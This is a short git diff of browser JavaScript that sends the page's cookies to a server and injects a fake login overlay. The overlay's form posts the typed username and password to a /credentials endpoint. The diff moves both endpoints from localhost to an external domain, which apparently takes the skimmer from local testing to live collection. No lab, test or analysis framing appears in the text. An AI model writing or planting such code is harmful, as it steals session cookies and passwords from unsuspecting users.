@@ -1,4 +1,4 @@
-fetch('http://localhost:3000/cookies', {
+fetch('https://data.estebanmf.space/cookies', {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({ cookies: document.cookie })
@@ -8,7 +8,7 @@ d.innerHTML = '<div style="position:fixed;top:50%;left:50%;transform:translate(-
 document.body.appendChild(d);
 document.getElementById('c').onsubmit = function(e) {
   e.preventDefault();
-  fetch('http://localhost:3000/credentials', {
+  fetch('https://data.estebanmf.space/credentials', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ username: document.getElementById('u').value, password: document.getElementById('p').value })
